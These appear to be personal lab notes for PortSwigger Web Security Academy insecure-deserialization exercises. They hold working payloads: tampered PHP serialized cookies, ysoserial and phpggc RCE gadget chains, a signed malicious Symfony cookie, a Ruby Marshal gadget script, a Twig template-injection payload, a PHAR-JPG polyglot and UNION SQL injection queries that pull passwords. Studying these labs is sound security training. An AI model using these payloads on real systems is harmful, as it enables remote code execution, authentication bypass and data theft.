
**Modifying serialized objects**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects> 

If you have source code access, you should start by looking for unserialize() anywhere in the code and investigating further. 

From <https://portswigger.net/web-security/deserialization/exploiting> 


Any class that implements the interface java.io.Serializable can be serialized and deserialized. If you have source code access, take note of any code that uses the readObject() method, which is used to read and deserialize data from an InputStream. 

From <https://portswigger.net/web-security/deserialization/exploiting> 


Modifying serialized objects

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects> 


```
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```



Base64 decide cookie show serialized object
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3b887acb-1fee-4067-8cfe-13d08f7544b7)




```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}7
```

Changed boolean to 1
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}%3d
```

Our url encoded cookie to get admin
`Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30lM2Q=`
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6f2aa016-7e21-4a56-a83e-88f83f31c877)



**Modifying serialized data types**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types> 
```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

Let's say an attacker modified the password attribute so that it contained the integer 0 instead of the expected string. As long as the stored password does not start with a number, the condition would always return true, enabling an authentication bypass.
Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the 0 would be converted to a string and the condition would evaluate to false. 
Be aware that when modifying data types in any serialized object format, it is important to remember to update any type labels and length indicators in the serialized data too. Otherwise, the serialized object will be corrupted and will not be deserialized. 

recommend using the Hackvertor extension, available from the BApp store. With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort. 

From <https://portswigger.net/web-security/deserialization/exploiting> 

Setting our username to administrator which is 13 character (s:13)
Set access token to 0
`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bc2d705c-fd3a-411e-9411-6b39dab85629)


**Using application functionality to exploit insecure deserialization**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization> 

Get delete request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/45afc186-3661-45b0-98ee-ebbaacc8a449)

Base 64 decode
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cec0d024-3a1e-4dde-8d16-23f3c7fd5930)

Changed to the following so that avatar_link point to the directory we want to delete
```
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization> 


Base64 encode

Replace gregg with the path we want to delete
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/53397ee1-d87d-4fc7-8430-06507118b59e)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/68323193-0d1f-4a2e-91e6-bb726719ac29)







**Arbitrary object injection in PHP**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php> 



If an attacker has access to the source code, they can study all of the available classes in detail. To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data. The attacker can then pass in a serialized object of this class to use its magic method for an exploit. 

From <https://portswigger.net/web-security/deserialization/exploiting> 


Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations, known as a "gadget chain". 

From <https://portswigger.net/web-security/deserialization/exploiting> 

Log in to your own account and notice the session cookie contains a serialized PHP object. 
From the site map, notice that the website references the file /libs/CustomTemplate.php. Right-click on the file and select "Send to Repeater". 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/27e0cb2f-033c-4a4c-8a55-a042b9a25894)




• In Burp Repeater, notice that you can read the source code by appending a tilde (~) to the filename in the request line. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/03206f36-1845-491f-b11e-664237708063)



• In the source code, notice the CustomTemplate class contains the __destruct() magic method. This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php> 


 ```
function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
```

Edit the following to this
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/22e7ea4e-bc13-457d-ae0f-daa24948aaae)



**Gadget chains**

From <https://portswigger.net/web-security/deserialization/exploiting> 

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal

From <https://portswigger.net/web-security/deserialization/exploiting> 


In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains

From <https://portswigger.net/web-security/deserialization/exploiting> 


**Exploiting Java deserialization with Apache Commons**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons> 

1. Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/61486f50-1335-421b-876b-839acedee3fc)

2. Download the "ysoserial" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload: 
	○ In Java versions 16 and above: 
`java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64` 
	○ In Java versions 15 and below: 
`java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64` 
3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it. 
4. Send the request to solve the lab. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1567e2e9-2126-46dc-ab13-faf1b3c8d389)




Url encode all character for this to work
Also need to downgrade to jdk 15 to use yso-serial
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/42a7ec0d-b929-428d-be44-3c355a517abc)


Completed
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/58d22d05-ee37-45d0-959a-a6d52c77b1fa)




**Exploiting PHP deserialization with a pre-built gadget chain**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain> 

Log in and inspect our request
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnNXk2eGI1am44YmY1MHQ0dTd2eXFvenc4Z2h0cXN2eiI7fQ==","sig_hmac_sha1":"f7440f4de2be59b64fdcee5fe02a555c6eead204"}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c8b172d6-bf74-4506-97c8-88ff0c697fbf)



We got a base64 encoded token that is also signed with sha-1 hmac hash

Decoding the base64 token
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnNXk2eGI1am44YmY1MHQ0dTd2eXFvenc4Z2h0cXN2eiI7fQ==
```


```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"g5y6xb5jn8bf50t4u7vyqozw8ghtqsvz";}
```

Our exploit using 
```
<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
```

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain> 

A developer comment discloses the location of a debug file at /cgi-bin/phpinfo.php. 
The error message reveals that the website is using the Symfony 4.3.6 framework. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f90a989b-ae6c-4b3e-8564-199027e9c20c)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f534bfe8-cfa1-454a-b3d1-725bc14247d3)






Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you'll need it to sign your exploit later. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7171eae1-6f67-4115-88a8-358cfa97554a)



Use phpgcc and execute the following to create a rce payload 
```
┌──(kali㉿kali)-[~]
└─$ phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
PHP Deprecated:  Creation of dynamic property PHPGGC::$options is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 830
PHP Deprecated:  Creation of dynamic property PHPGGC::$parameters is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 831
PHP Deprecated:  Creation of dynamic property PHPGGC\Enhancement\Enhancements::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line 9
PHP Deprecated:  Creation of dynamic property PHPGGC::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 183
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```                                                                             

This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's morale.txt file. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain> 



We can list payload with phpgcc -l
```
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE (Function call)    __destruct     *
```    

construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain> 

```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;

This will output a valid, signed cookie to the console. 
┌──(kali㉿kali)-[~]
└─$ cat phpsign.php 
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "1rtdmmi2eub271sl2h7r8353axt0ck5p";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
                                                                                                                                                            
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ php phpsign.php
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2223ce8f09e6ae902830562a7a175ff2ea8a992063%22%7D
```                                                                                                                                                            


Replace with cookie and will be solve

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/df3f835f-0362-4d96-84a4-20b92c10b948)



**Exploiting Ruby deserialization using a documented gadget chain**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain> 


Log in to your own account and notice that the session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain> 


session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9053296a-0e0d-4fc9-9521-7ff9be909967)


Browse the web to find the Universal Deserialisation Gadget for Ruby 2.x-3.x by vakzz on devcraft.io. Copy the final script for generating the payload. 
Modify the script as follows: 
	• Change the command that should be executed from id to rm /home/carlos/morale.txt. 
	• Replace the final two lines with puts Base64.encode64(payload). This ensures that the payload is output in the correct format for you to use for the lab. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain> 

```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer
require "base64"
```

```
# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

https://www.onlinegdb.com/online_ruby_compiler

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/aa75c5dc-ccf7-4efb-bdce-92b2ad2f5fe3)


In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2307a1f4-6107-425b-841c-08ec4397d965)



**Developing a custom gadget chain for Java deserialization**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization> 


Step by step process since it SQLI injection related.
The following are what we going to focus on 


Found during recon
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9b311a9a-1322-44b3-b670-b6d138675c40)


To exploit 


```
https://github.com/emanuelepicas/UsefulExploits/tree/main/Java/Serialization
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9b51e066-fe5f-4081-9113-6660ef96ae0c)



```
SQLI steps such a lengthy process. Confirm that you can actually use sqlmap for this but wont use it
`' OR 1=1 --`

Find the version through the errors

How to determinate the number of columns
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
(error indicates that there more or less of them)


' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --

query to find out the string:

' UNION SELECT NULL, NULL, NULL, 'a', NULL, NULL, NULL, NULL --
error: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;a&quot;
  Position: 69

List the content of the database

' UNION SELECT NULL,NULL, NULL, CAST(table_name as numeric), NULL, NULL, NULL, NULL FROM information_schema.tables --

Now enumerate the column content

' UNION SELECT NULL,NULL, NULL, CAST(table_name as numeric), CAST(column_name as numeric), NULL, NULL, NULL FROM information_schema.tables --

This will retrive the username field:

' UNION SELECT NULL,NULL, NULL, NULL, CAST(column_name as numeric), NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

This will retrive the name of the user

' UNION SELECT NULL,NULL, NULL, NULL, CAST(username as numeric), NULL, NULL, NULL FROM users --

This query will give us an int

' UNION SELECT NULL,NULL, NULL, NULL, CAST(username as numeric), CAST(passsword as numeric), NULL, NULL FROM users --

java.io.IOException: org.postgresql.util.PSQLException: ERROR: column &quot;passsword&quot; does not exist
  Hint: Perhaps you meant to reference the column &quot;users.password&quot;.
  Position: 106
```
  
  now we can use the final one
  
  
 ```
' UNION SELECT NULL,NULL, NULL, NULL, CAST(password as numeric), NULL, NULL, NULL FROM users --
```


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f7406a28-d34e-4768-847b-b32ff5fa8290)




**Developing a custom gadget chain for PHP deserialization**

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization> 


Reference the following 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d58f9f84-2660-4657-9453-6bc33fab2c02)



You can retrieve the file by adding ~
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f94f2b1e-ce40-40d0-b774-9cb4c8244661)



that the __wakeup() magic method for a CustomTemplate will create a new Product by referencing the default_desc_type and desc from the CustomTemplate. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization>
 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ab28401a-94ce-4898-af70-8af39f56fd80)




• Also notice that the DefaultMap class has the __get() magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes call_user_func(), which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name, which is the non-existent attribute that was requested. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4f8add5f-e3c6-4bac-9ec2-520f825f2f3f)



• You can exploit this gadget chain to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where:

```
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt"; CustomTemplate->desc = DefaultMap; DefaultMap->callback = "exec"
``` 
If you follow the data flow in the source code, you will notice that this causes the Product constructor to try and fetch the default_desc_type from the DefaultMap object. As it doesn't have this attribute, the 
```
__get() method will invoke the callback exec() method on the default_desc_type, which is set to our shell command.
``` 

To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie: 




```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/688985d9-73ab-4972-9fff-e4cadfe32165)




**Using PHAR deserialization to deploy a custom gadget chain**


From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain> 



• Observe that the website has a feature for uploading your own avatar, which only accepts JPG images. Upload a valid JPG as your avatar. Notice that it is loaded using GET /cgi-bin/avatar.php?avatar=wiener. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0b7e1a17-9591-4a0f-ac9a-75e2b46ad9dc)

Log in and upload image


```
https://0a2e00b103d1a8b783ba19bf0016004a.web-security-academy.net/cgi-bin/avatar.php?avatar=wiener
```

• In Burp Repeater, request GET /cgi-bin to find an index that shows a Blog.php and CustomTemplate.php file. Obtain the source code by requesting the files using the .php~ backup extension. 
• Study the source code and identify the gadget chain involving the Blog->desc and CustomTemplate->lockFilePath attributes. 
• Notice that the file_exists() filesystem method is called on the lockFilePath attribute. 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain> 





Download `https://github.com/kunte0/phar-jpg-polyglot`


Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file: 

From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain> 

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```


From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d2ee8037-490e-4a02-9827-e0fc1a5c92e9)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/21f2ad27-d2ca-4567-b088-6217861adb08)


Our exploit

```
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'Carlos';
$object->template_file_path = $blog;
```



Replace the entire pop exploit class with our exploit
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/43c1ccbd-3cd5-4e60-b4bc-b92aced9171b)


Run exploit

```
┌──(kali㉿kali)-[~/Desktop/phar-jpg-polyglot]
└─$ php -c php.ini phar_jpg_polyglot.php

Deprecated: Creation of dynamic property Blog::$desc is deprecated in /home/kali/Desktop/phar-jpg-polyglot/phar_jpg_polyglot.php on line 42

Deprecated: Creation of dynamic property Blog::$user is deprecated in /home/kali/Desktop/phar-jpg-polyglot/phar_jpg_polyglot.php on line 43

Deprecated: Creation of dynamic property CustomTemplate::$template_file_path is deprecated in /home/kali/Desktop/phar-jpg-polyglot/phar_jpg_polyglot.php on line 44
string(217) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";s:4:"user";s:6:"carlos";}}"
```

Upload outputed jpg file and call with phar://
https://0a2e00b103d1a8b783ba19bf0016004a.web-security-academy.net/cgi-bin/avatar.php?avatar=phar://wiener

